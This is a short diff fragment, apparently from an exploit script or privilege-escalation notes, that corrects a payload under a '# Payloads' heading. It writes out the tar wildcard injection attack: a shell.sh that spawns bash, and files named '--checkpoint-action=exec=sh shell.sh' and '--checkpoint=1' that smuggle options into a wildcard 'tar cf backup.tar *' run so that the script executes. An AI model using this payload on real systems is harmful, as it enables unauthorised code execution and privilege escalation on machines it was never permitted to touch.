@@ -50,7 +50,7 @@ tar cf backup.tar *
 
 # Payloads
 cd /opt/backups
-echo '#/!bin/bash\n/bin/bash' > shell.sh
+echo -e '#!/bin/bash\n/bin/bash' > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 
